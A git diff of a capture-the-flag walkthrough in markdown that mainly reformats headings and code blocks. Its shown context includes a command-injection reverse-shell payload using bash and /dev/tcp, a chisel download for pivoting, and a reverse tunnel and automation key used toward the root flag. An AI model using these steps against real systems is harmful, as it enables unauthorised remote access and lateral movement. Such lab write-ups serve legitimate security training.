@@ -30,17 +30,20 @@ $(bash -c 'bash -i >& /dev/tcp/Lhost/Lport 0>&1')
 User flag at
 ```
 /home/web/user.txt
+```
 <br>
 <br>
 
-# Getting the root flag
-```
+# Path to escalation
+
 Get all listenning services on the target box with
+
 ```
 ss -tulnp
 ```
 Use chisel 
-```wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O /tmp/chisel.gz \
+```bash
+wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O /tmp/chisel.gz \
 gunzip /tmp/chisel.gz \
 chmod +x /tmp/chisel
 ```
@@ -71,6 +74,11 @@ While in the PBX dashboard, click the plus icon to add a new voice mail, found.
 ```
 "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
 ```
+<br>
+<br>
+
+# Getting the root flag
+
 with that, map another chisel instance on 127.0.0.1:9000 in the target box to our machine with;
 ```
 ./chisel client 192.168.130.228:8080 R:9000:127.0.0.1:9000
